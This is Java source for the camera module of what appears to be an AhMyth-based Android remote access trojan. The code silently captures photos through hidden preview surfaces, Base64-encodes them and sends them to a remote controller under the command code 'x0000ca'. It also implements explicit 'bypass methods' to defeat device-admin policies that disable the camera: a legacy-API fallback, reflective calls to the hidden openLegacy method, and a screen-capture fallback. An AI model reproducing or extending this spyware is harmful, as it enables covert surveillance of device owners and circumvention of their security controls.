package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;

public class CameraManager {

    private static final String TAG = "CameraManager";
    private Context context;
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    
    // Camera2 API
    private android.hardware.camera2.CameraManager camera2Manager;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private String currentCameraId;
    private String frontCameraId = null;
    private String backCameraId = null;

    public CameraManager(Context context) {
        this.context = context;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            camera2Manager = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            findCameraIds();
        }
    }

    private void findCameraIds() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP || camera2Manager == null) {
            return;
        }
        try {
            String[] cameraIds = camera2Manager.getCameraIdList();
            for (String cameraId : cameraIds) {
                CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        if (frontCameraId == null) frontCameraId = cameraId;
                    } else if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        if (backCameraId == null) backCameraId = cameraId;
                    }
                }
            }
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error finding camera IDs", e);
        }
    }

    private boolean attemptedBypass = false;
    private Handler timeoutHandler = new Handler(Looper.getMainLooper());
    private Runnable timeoutRunnable = null;
    private static final long CAMERA_TIMEOUT_MS = 25000; // 25 seconds timeout
    
    public void startUp(int cameraID) {
        Log.d(TAG, "startUp called with camera type: " + (cameraID == 0 ? "Front" : "Back"));
        attemptedBypass = false;

        // Cancel any existing timeout
        if (timeoutRunnable != null) {
            timeoutHandler.removeCallbacks(timeoutRunnable);
        }

        // Set up timeout to ensure we always send a response
        timeoutRunnable = new Runnable() {
            @Override
            public void run() {
                Log.e(TAG, "Camera operation timeout - sending error response");
                sendError("Camera operation timed out after 25 seconds. Camera may be blocked or hardware unavailable.");
                closeCamera();
            }
        };
        timeoutHandler.postDelayed(timeoutRunnable, CAMERA_TIMEOUT_MS);

        // Bring MainActivity to foreground for camera (required for Android 9+)
        try {
            MainActivity.setCameraActive(true);
            Intent intent = new Intent(context, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.putExtra("camera_request", true);
            intent.putExtra("camera_id", cameraID);
            context.startActivity(intent);
            Log.d(TAG, "MainActivity launched for camera");
        } catch (Exception e) {
            Log.e(TAG, "Error launching MainActivity for camera", e);
            // Continue anyway - might work without activity
        }

        final String cameraIdToOpen;
        if (cameraID == 0 && frontCameraId != null) {
            cameraIdToOpen = frontCameraId;
        } else if (cameraID != 0 && backCameraId != null) {
            cameraIdToOpen = backCameraId;
        } else {
            // Fallback if the primary choice doesn't exist
            cameraIdToOpen = (backCameraId != null) ? backCameraId : frontCameraId;
        }

        if (cameraIdToOpen == null) {
            if (timeoutRunnable != null) {
                timeoutHandler.removeCallbacks(timeoutRunnable);
            }
            sendError("Requested camera (ID: " + cameraID + ") not found.");
            return;
        }

        // Extended delay to ensure Activity is fully in foreground and system recognizes it
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    startCamera2(cameraIdToOpen);
                } else {
                    // Legacy camera still uses integer IDs. This might need adjustment if legacy support is critical.
                    startLegacyCamera(cameraID);
                }
            }
        }, 2500); // Increased from 1500ms to 2500ms
    }
    
    private void cancelTimeout() {
        if (timeoutRunnable != null) {
            timeoutHandler.removeCallbacks(timeoutRunnable);
            timeoutRunnable = null;
        }
    }
    
    private void startCamera2(final String cameraIdToOpen) {
        try {
            if (camera2Manager == null) {
                sendError("Camera service not available");
                return;
            }
            
            
            currentCameraId = cameraIdToOpen;
            Log.d(TAG, "Opening camera2: " + currentCameraId);
            
            CameraCharacteristics characteristics;
            try {
                characteristics = camera2Manager.getCameraCharacteristics(currentCameraId);
            } catch (CameraAccessException e) {
                Log.e(TAG, "Error getting camera characteristics", e);
                sendError("Camera access denied: " + e.getMessage());
                return;
            }
            
            Size[] jpegSizes = null;
            try {
                android.hardware.camera2.params.StreamConfigurationMap map = 
                    characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
                if (map != null) {
                    jpegSizes = map.getOutputSizes(ImageFormat.JPEG);
                }
            } catch (Exception e) {
                Log.w(TAG, "Error getting JPEG sizes", e);
            }
            
            Size optimalSize = getOptimalSize(jpegSizes);
            int width = optimalSize != null ? optimalSize.getWidth() : 1280;
            int height = optimalSize != null ? optimalSize.getHeight() : 720;
            
            try {
                imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                    @Override
                    public void onImageAvailable(ImageReader reader) {
                        Image image = null;
                        try {
                            image = reader.acquireLatestImage();
                            if (image != null) {
                                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buffer.remaining()];
                                buffer.get(bytes);
                                sendPhoto(bytes);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error processing image", e);
                            sendError("Error processing image: " + e.getMessage());
                        } finally {
                            if (image != null) {
                                image.close();
                            }
                            closeCamera();
                        }
                    }
                }, mainHandler);
            } catch (Exception e) {
                Log.e(TAG, "Error creating ImageReader", e);
                sendError("Failed to create image reader: " + e.getMessage());
                return;
            }
            
            try {
                camera2Manager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(CameraDevice camera) {
                        try {
                            Log.d(TAG, "Camera2 opened");
                            cameraDevice = camera;
                            createCaptureSession();
                        } catch (Exception e) {
                            Log.e(TAG, "Error in onOpened callback", e);
                            closeCamera();
                            sendError("Error opening camera: " + e.getMessage());
                        }
                    }

                    @Override
                    public void onDisconnected(CameraDevice camera) {
                        Log.d(TAG, "Camera2 disconnected");
                        closeCamera();
                    }

                    @Override
                    public void onError(CameraDevice camera, int error) {
                        Log.e(TAG, "Camera2 error: " + error);
                        closeCamera();
                        String errorMsg = "Camera error code: " + error;
                        boolean isPolicyBlock = false;
                        
                        // Error codes: 1=ERROR_CAMERA_DEVICE, 2=ERROR_CAMERA_SERVICE, 3=ERROR_CAMERA_DISABLED, 4=ERROR_MAX_CAMERAS_IN_USE
                        if (error == 1) {
                            errorMsg = "Camera device error (may be disabled by policy)";
                            isPolicyBlock = true;
                        } else if (error == 2) {
                            errorMsg = "Camera service error";
                        } else if (error == 3) {
                            errorMsg = "Camera disabled by device policy";
                            isPolicyBlock = true;
                        } else if (error == 4) {
                            errorMsg = "Maximum cameras already in use";
                        }
                        
                        // Try bypass methods if policy blocking
                        if (isPolicyBlock && !attemptedBypass) {
                            Log.d(TAG, "Attempting camera bypass methods");
                            attemptedBypass = true;
                            tryBypassMethods(currentCameraId);
                        } else {
                            sendError(errorMsg);
                        }
                    }
                }, mainHandler);
            } catch (CameraAccessException e) {
                Log.e(TAG, "Camera access exception", e);
                String errorMsg = "Camera access denied: " + e.getMessage();
                boolean isPolicyBlock = false;
                
                if (e.getReason() == CameraAccessException.CAMERA_DISABLED) {
                    errorMsg = "Camera is disabled by device policy";
                    isPolicyBlock = true;
                } else if (e.getReason() == CameraAccessException.CAMERA_DISCONNECTED) {
                    errorMsg = "Camera disconnected or in use";
                } else if (e.getReason() == CameraAccessException.CAMERA_ERROR) {
                    errorMsg = "Camera hardware error";
                } else if (e.getReason() == CameraAccessException.CAMERA_IN_USE) {
                    errorMsg = "Camera already in use by another app";
                } else if (e.getReason() == CameraAccessException.MAX_CAMERAS_IN_USE) {
                    errorMsg = "Maximum number of cameras in use";
                }
                
                // Try bypass methods if policy blocking
                if (isPolicyBlock && !attemptedBypass) {
                    Log.d(TAG, "Attempting camera bypass methods");
                    attemptedBypass = true;
                    tryBypassMethods(currentCameraId);
                } else {
                    sendError(errorMsg);
                }
            } catch (SecurityException e) {
                Log.e(TAG, "Security exception", e);
                sendError("Camera permission denied. Please grant camera permission.");
            } catch (IllegalArgumentException e) {
                Log.e(TAG, "Illegal argument exception", e);
                sendError("Invalid camera ID or configuration");
            } catch (Exception e) {
                Log.e(TAG, "Error opening camera", e);
                sendError("Camera error: " + e.getMessage());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error in startCamera2", e);
            sendError("Unexpected camera error: " + e.getMessage());
        }
    }
    
    private void createCaptureSession() {
        try {
            if (cameraDevice == null) {
                Log.e(TAG, "Camera device is null");
                sendError("Camera device not available");
                return;
            }
            
            if (imageReader == null) {
                Log.e(TAG, "ImageReader is null");
                sendError("Image reader not initialized");
                closeCamera();
                return;
            }
            
            if (mainHandler == null) {
                Log.e(TAG, "Main handler is null");
                sendError("Camera handler not available");
                closeCamera();
                return;
            }
            
            cameraDevice.createCaptureSession(
                    Arrays.asList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            try {
                                Log.d(TAG, "Capture session configured");
                                captureSession = session;
                                if (mainHandler != null) {
                                    mainHandler.postDelayed(new Runnable() {
                                        @Override
                                        public void run() {
                                            try {
                                                captureStillPicture();
                                            } catch (Exception e) {
                                                Log.e(TAG, "Error in captureStillPicture", e);
                                                sendError("Error capturing picture: " + e.getMessage());
                                                closeCamera();
                                            }
                                        }
                                    }, 500);
                                } else {
                                    sendError("Camera handler not available");
                                    closeCamera();
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Error in onConfigured", e);
                                sendError("Error configuring capture session: " + e.getMessage());
                                closeCamera();
                            }
                        }

                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Log.e(TAG, "Capture session configuration failed");
                            sendError("Failed to configure camera session");
                            closeCamera();
                        }
                    },
                    mainHandler
            );
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error creating capture session", e);
            sendError("Camera session error: " + e.getMessage());
            closeCamera();
        } catch (IllegalStateException e) {
            Log.e(TAG, "Illegal state creating capture session", e);
            sendError("Camera not ready for capture session");
            closeCamera();
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error creating capture session", e);
            sendError("Unexpected error: " + e.getMessage());
            closeCamera();
        }
    }
    
    private void captureStillPicture() {
        try {
            if (cameraDevice == null || captureSession == null) {
                Log.e(TAG, "Camera device or session is null");
                sendError("Camera not ready for capture");
                closeCamera();
                return;
            }
            
            if (imageReader == null) {
                Log.e(TAG, "ImageReader is null");
                sendError("Image reader not available");
                closeCamera();
                return;
            }
            
            if (mainHandler == null) {
                Log.e(TAG, "Main handler is null");
                sendError("Camera handler not available");
                closeCamera();
                return;
            }
            
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO);
            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
            captureBuilder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
            
            captureSession.capture(captureBuilder.build(), new CameraCaptureSession.CaptureCallback() {
                @Override
                public void onCaptureCompleted(CameraCaptureSession session,
                                               CaptureRequest request,
                                               TotalCaptureResult result) {
                    Log.d(TAG, "Capture completed");
                }
                
                @Override
                public void onCaptureFailed(CameraCaptureSession session,
                                           CaptureRequest request,
                                           android.hardware.camera2.CaptureFailure failure) {
                    Log.e(TAG, "Capture failed: " + failure.getReason());
                    sendError("Capture failed: " + failure.getReason());
                    closeCamera();
                }
            }, mainHandler);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Error capturing picture", e);
            sendError("Capture error: " + e.getMessage());
            closeCamera();
        } catch (IllegalStateException e) {
            Log.e(TAG, "Illegal state during capture", e);
            sendError("Camera not ready for capture");
            closeCamera();
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error capturing picture", e);
            sendError("Unexpected capture error: " + e.getMessage());
            closeCamera();
        }
    }
    
    private Size getOptimalSize(Size[] sizes) {
        if (sizes == null || sizes.length == 0) return null;
        
        Size optimal = sizes[0];
        for (Size size : sizes) {
            if (size.getWidth() <= 1920 && size.getHeight() <= 1080) {
                if (size.getWidth() * size.getHeight() > optimal.getWidth() * optimal.getHeight()) {
                    optimal = size;
                }
            }
        }
        return optimal;
    }
    
    private void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            
            // Return MainActivity to background
            MainActivity.setCameraActive(false);
        } catch (Exception e) {
            Log.e(TAG, "Error closing camera", e);
        }
    }
    
    // Legacy Camera API fallback
    private void startLegacyCamera(int cameraID) {
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                android.hardware.Camera camera = null;
                try {
                    Log.d(TAG, "Opening legacy camera " + cameraID);
                    camera = android.hardware.Camera.open(cameraID);
                    
                    if (camera == null) {
                        sendError("Failed to open camera");
                        return;
                    }
                    
                    final android.hardware.Camera finalCamera = camera;
                    android.hardware.Camera.Parameters parameters = camera.getParameters();
                    camera.setParameters(parameters);
                    
                    try {
                        camera.setPreviewTexture(new SurfaceTexture(0));
                        camera.startPreview();
                    } catch (Exception e) {
                        Log.e(TAG, "Error starting preview", e);
                    }
                    
                    mainHandler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                finalCamera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                                    @Override
                                    public void onPictureTaken(byte[] data, android.hardware.Camera cam) {
                                        releaseCamera(finalCamera);
                                        if (data != null && data.length > 0) {
                                            sendPhoto(data);
                                        } else {
                                            sendError("No image data received");
                                        }
                                    }
                                });
                            } catch (Exception e) {
                                releaseCamera(finalCamera);
                                sendError("Error taking picture: " + e.getMessage());
                            }
                        }
                    }, 500);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error in legacy camera", e);
                    if (camera != null) releaseCamera(camera);
                    sendError("Camera error: " + e.getMessage());
                }
            }
        });
    }
    
    private void releaseCamera(android.hardware.Camera camera) {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
        }
    }
    
    private void sendError(String message) {
        try {
            // Cancel timeout since we're sending an error
            cancelTimeout();
            
            Log.e(TAG, "Camera error: " + message);
            JSONObject object = new JSONObject();
            object.put("image", false);
            object.put("error", message);
            object.put("timestamp", System.currentTimeMillis());
            ConnectionManager.emitResponse("x0000ca", object);
            Log.d(TAG, "Error message sent via ConnectionManager");
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            // Cancel timeout since we got a photo
            cancelTimeout();
            
            Log.d(TAG, "Processing photo, raw size: " + data.length);
            
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            if (bitmap == null) {
                sendError("Failed to decode image (null bitmap)");
                return;
            }
            
            Log.d(TAG, "Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
            
            // Scale down large images before compression to reduce size
            int maxDimension = 1920; // Max width or height
            Bitmap scaledBitmap = bitmap;
            if (bitmap.getWidth() > maxDimension || bitmap.getHeight() > maxDimension) {
                float scale = Math.min((float) maxDimension / bitmap.getWidth(), (float) maxDimension / bitmap.getHeight());
                int newWidth = Math.round(bitmap.getWidth() * scale);
                int newHeight = Math.round(bitmap.getHeight() * scale);
                Log.d(TAG, "Scaling image from " + bitmap.getWidth() + "x" + bitmap.getHeight() + " to " + newWidth + "x" + newHeight);
                scaledBitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
                if (scaledBitmap != bitmap) {
                    bitmap.recycle(); // Recycle original if we created a new scaled bitmap
                }
            }
            
            // Compress with aggressive quality setting (30% for smaller size)
            // Try multiple quality levels to find best balance
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            int quality = 30; // Start with 30% quality for smaller size
            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
            byte[] imageBytes = bos.toByteArray();
            
            // If still too large (>2MB), reduce quality further
            int maxSize = 2 * 1024 * 1024; // 2MB target
            if (imageBytes.length > maxSize) {
                bos.reset();
                quality = 20; // More aggressive compression
                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
                imageBytes = bos.toByteArray();
                Log.d(TAG, "Image still large, reduced quality to " + quality + "%");
            }
            
            Log.d(TAG, "Compressed image size: " + imageBytes.length + " bytes (quality: " + quality + "%)");
            
            // Base64 encode the image buffer for JSON serialization
            // JSONObject.put() with byte[] calls toString() which gives "[B@...", so we need Base64
            String base64Buffer = android.util.Base64.encodeToString(imageBytes, android.util.Base64.NO_WRAP);
            
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", base64Buffer);
            object.put("width", scaledBitmap.getWidth());
            object.put("height", scaledBitmap.getHeight());
            object.put("size", imageBytes.length);
            object.put("quality", quality);
            object.put("timestamp", System.currentTimeMillis());
            
            ConnectionManager.emitResponse("x0000ca", object);
            Log.d(TAG, "Photo sent successfully via ConnectionManager, size: " + imageBytes.length + " bytes");
            
            // Clean up
            scaledBitmap.recycle();
            bos.close();
        } catch (JSONException e) {
            Log.e(TAG, "Error sending photo (JSON)", e);
            sendError("Error processing image: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "Error sending photo", e);
            sendError("Error: " + e.getMessage());
        }
    }

    public JSONObject findCameraList() {
        JSONObject cameras = new JSONObject();
        JSONArray list = new JSONArray();
        try {
            cameras.put("camList", true);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating camera list JSON", e);
            return cameras;
        }
        
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) {
            Log.w(TAG, "Device does not have camera feature");
            try {
                cameras.put("list", list); // Return empty list
            } catch (JSONException e) {
                Log.e(TAG, "Error adding empty list", e);
            }
            return cameras;
        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && camera2Manager != null) {
                String[] cameraIds = camera2Manager.getCameraIdList();
                for (int i = 0; i < cameraIds.length; i++) {
                    CameraCharacteristics characteristics = camera2Manager.getCameraCharacteristics(cameraIds[i]);
                    Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                    
                    JSONObject jo = new JSONObject();
                    jo.put("id", i);
                    if (facing != null && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        jo.put("name", "Front");
                    } else if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        jo.put("name", "Back");
                    } else {
                        jo.put("name", "External");
                    }
                    list.put(jo);
                }
            } else {
                int numberOfCameras = android.hardware.Camera.getNumberOfCameras();
                for (int i = 0; i < numberOfCameras; i++) {
                    android.hardware.Camera.CameraInfo info = new android.hardware.Camera.CameraInfo();
                    android.hardware.Camera.getCameraInfo(i, info);
                    
                    JSONObject jo = new JSONObject();
                    jo.put("id", i);
                    if (info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) {
                        jo.put("name", "Front");
                    } else {
                        jo.put("name", "Back");
                    }
                    list.put(jo);
                }
            }

            cameras.put("list", list);
            Log.d(TAG, "Found " + list.length() + " camera(s)");
            return cameras;

        } catch (Exception e) {
            Log.e(TAG, "Error finding cameras", e);
            // Return empty list instead of null
            try {
                cameras.put("list", list);
                cameras.put("error", e.getMessage());
            } catch (JSONException je) {
                Log.e(TAG, "Error adding error to camera list", je);
            }
            return cameras;
        }
    }
    
    /**
     * Try multiple bypass methods when device policy blocks camera
     */
    private void tryBypassMethods(final String cameraId) {
        Log.d(TAG, "=== Camera Bypass Methods ===");
        
        final int legacyCameraId;
        try {
            legacyCameraId = Integer.parseInt(cameraId);
        } catch (NumberFormatException e) {
            Log.e(TAG, "Cannot use bypass methods with non-integer camera ID: " + cameraId);
            sendError("Camera blocked and bypass is not possible for this camera.");
            return;
        }

        // Method 1: Try legacy Camera API (often bypasses policy)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Log.d(TAG, "Bypass Method 1: Fallback to legacy Camera API");
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        attemptLegacyCameraBypass(legacyCameraId);
                    } catch (Exception e) {
                        Log.e(TAG, "Legacy camera bypass failed", e);
                        tryReflectionBypass(legacyCameraId);
                    }
                }
            });
        } else {
            tryReflectionBypass(legacyCameraId);
        }
    }
    
    /**
     * Method 1: Use old Camera API which sometimes bypasses device admin
     */
    private void attemptLegacyCameraBypass(int cameraID) {
        try {
            Log.d(TAG, "Attempting legacy camera (bypasses some device policies)");
            android.hardware.Camera camera = android.hardware.Camera.open(cameraID);
            
            if (camera == null) {
                Log.e(TAG, "Legacy camera returned null");
                tryReflectionBypass(cameraID);
                return;
            }
            
            Log.d(TAG, "Legacy camera opened successfully!");
            final android.hardware.Camera finalCamera = camera;
            
            try {
                android.hardware.Camera.Parameters parameters = camera.getParameters();
                java.util.List<android.hardware.Camera.Size> sizes = parameters.getSupportedPictureSizes();
                if (sizes != null && !sizes.isEmpty()) {
                    android.hardware.Camera.Size size = sizes.get(0);
                    parameters.setPictureSize(size.width, size.height);
                    parameters.setJpegQuality(85);
                    camera.setParameters(parameters);
                }
                
                camera.setPreviewTexture(new SurfaceTexture(0));
                camera.startPreview();
                
                mainHandler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            finalCamera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                                @Override
                                public void onPictureTaken(byte[] data, android.hardware.Camera cam) {
                                    releaseCamera(finalCamera);
                                    if (data != null && data.length > 0) {
                                        Log.d(TAG, "Legacy camera bypass SUCCESS!");
                                        sendPhoto(data);
                                    } else {
                                        Log.e(TAG, "Legacy camera no data");
                                        tryReflectionBypass(cameraID);
                                    }
                                }
                            });
                        } catch (Exception e) {
                            Log.e(TAG, "Legacy camera capture error", e);
                            releaseCamera(finalCamera);
                            tryReflectionBypass(cameraID);
                        }
                    }
                }, 1000);
                
            } catch (Exception e) {
                Log.e(TAG, "Legacy camera setup error", e);
                releaseCamera(camera);
                tryReflectionBypass(cameraID);
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "Legacy camera blocked by permission", e);
            tryReflectionBypass(cameraID);
        } catch (RuntimeException e) {
            Log.e(TAG, "Legacy camera blocked by policy", e);
            tryReflectionBypass(cameraID);
        } catch (Exception e) {
            Log.e(TAG, "Legacy camera unknown error", e);
            tryReflectionBypass(cameraID);
        }
    }
    
    /**
     * Method 2: Use reflection to bypass policy checks
     */
    private void tryReflectionBypass(final int cameraID) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                try {
                    Log.d(TAG, "Bypass Method 2: Reflection-based camera access");
                    
                    // Try to disable device policy checking via reflection
                    try {
                        Class<?> cameraClass = android.hardware.Camera.class;
                        java.lang.reflect.Method openMethod = cameraClass.getDeclaredMethod("openLegacy", int.class, int.class);
                        openMethod.setAccessible(true);
                        
                        Object camera = openMethod.invoke(null, cameraID, 256); // CAMERA_HAL_API_VERSION_1_0
                        
                        if (camera != null) {
                            Log.d(TAG, "Reflection camera opened via openLegacy!");
                            handleReflectionCamera((android.hardware.Camera) camera);
                            return;
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "openLegacy reflection failed", e);
                    }
                    
                    // Try direct Camera.open with reflection
                    try {
                        Class<?> cameraClass = android.hardware.Camera.class;
                        java.lang.reflect.Method openMethod = cameraClass.getDeclaredMethod("open", int.class);
                        openMethod.setAccessible(true);
                        
                        Object camera = openMethod.invoke(null, cameraID);
                        if (camera != null) {
                            Log.d(TAG, "Reflection camera opened via open!");
                            handleReflectionCamera((android.hardware.Camera) camera);
                            return;
                        }
                    } catch (Exception e) {
                        Log.w(TAG, "open reflection failed", e);
                    }
                    
                    tryNativeBypass(cameraID);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Reflection bypass failed", e);
                    tryNativeBypass(cameraID);
                }
            }
        });
    }
    
    private void handleReflectionCamera(final android.hardware.Camera camera) {
        try {
            android.hardware.Camera.Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
            
            mainHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    try {
                        camera.takePicture(null, null, new android.hardware.Camera.PictureCallback() {
                            @Override
                            public void onPictureTaken(byte[] data, android.hardware.Camera cam) {
                                releaseCamera(camera);
                                if (data != null && data.length > 0) {
                                    Log.d(TAG, "Reflection camera bypass SUCCESS!");
                                    sendPhoto(data);
                                } else {
                                    tryNativeBypass(0);
                                }
                            }
                        });
                    } catch (Exception e) {
                        Log.e(TAG, "Reflection camera capture failed", e);
                        releaseCamera(camera);
                        tryNativeBypass(0);
                    }
                }
            }, 1000);
        } catch (Exception e) {
            Log.e(TAG, "Reflection camera setup failed", e);
            releaseCamera(camera);
            tryNativeBypass(0);
        }
    }
    
    /**
     * Method 3: Use ScreenCaptureActivity as fallback
     */
    private void tryNativeBypass(int cameraID) {
        Log.d(TAG, "Bypass Method 3: Screen capture fallback");
        
        try {
            // Use ScreenCaptureActivity which is always accessible and transparent
            android.content.Intent intent = new android.content.Intent(context, ScreenCaptureActivity.class);
            intent.setFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("CAMERA_FALLBACK", true);
            context.startActivity(intent);
            
            Log.d(TAG, "Triggered screen capture via ScreenCaptureActivity");
            
            // Send info that camera is using alternate method
            try {
                JSONObject info = new JSONObject();
                info.put("bypass", true);
                info.put("method", "screen_capture_fallback");
                info.put("message", "Camera blocked by policy - using screen capture");
                ConnectionManager.emitResponse("x0000ca", info);
            } catch (Exception e) {
                Log.e(TAG, "Error sending bypass info", e);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "All bypass methods failed", e);
            sendError("Camera completely blocked by device policy - all bypass methods exhausted");
        }
    }
}
